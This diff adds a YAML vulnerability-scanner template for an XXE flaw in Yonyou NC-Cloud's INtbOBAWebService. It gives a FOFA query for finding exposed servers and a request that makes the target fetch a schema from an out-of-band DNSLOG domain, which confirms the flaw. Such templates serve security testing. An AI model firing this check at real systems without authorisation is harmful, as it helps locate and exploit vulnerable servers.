@@ -1,0 +1,17 @@
+id: poc-yaml-yonyou-nc-cloud-intboba-webservice-xxe
+info:
+  name: 用友NC-Cloud INtbOBAWebService xxe漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友-NC-Cloud
+  fofa: body="/Client/Uclient/UClient.exe"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://{{.domain}}/win2.xml
+  expression: reverse.Verify()
+transport: http
